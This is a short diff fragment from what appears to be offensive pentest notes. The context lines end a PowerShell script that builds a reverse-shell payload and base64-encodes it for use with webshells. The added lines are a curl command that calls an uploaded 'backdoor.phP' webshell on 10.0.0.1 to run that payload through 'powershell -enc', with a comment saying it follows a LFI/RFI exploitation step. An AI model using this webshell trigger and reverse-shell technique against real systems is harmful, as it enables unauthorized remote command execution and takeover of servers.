@@ -4,3 +4,5 @@ $base64text =[Convert]::ToBase64String($bytening)
 $base64text
 
 # Above code will create a reverse shell payload in powershell as a string, then will encode to base64 and print it on the screen, to use with webshells.
+curl http://10.0.0.1/xpto/uploads/backdoor.phP?cmd=powershell%20-enc%20a6666669j43ff9ojas0e9jfasijd==
+# Will run the payload after a LFI/RFI  of backdoor.phP
